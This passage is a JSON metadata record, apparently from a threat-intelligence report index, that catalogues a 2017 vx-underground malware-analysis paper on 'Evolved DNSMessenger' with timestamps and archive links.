            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-10-11 - More info on 'Evolved DNSMessenger'.pdf"
    ],
    "report_names": [
        "2017-10-11 - More info on 'Evolved DNSMessenger'.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535927,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653704279,
    "ts_modification_date": 1653704279,
    "files": {
        "pdf": "https://archive.orkl.eu/8b09c34464e3a0e7ac852a36160cb2f0836f2b28.pdf",
        "text": "https://archive.orkl.eu/8b09c34464e3a0e7ac852a36160cb2f0836f2b28.txt",
        "img": "https://archive.orkl.eu/8b09c34464e3a0e7ac852a36160cb2f0836f2b28.jpg"
    }
}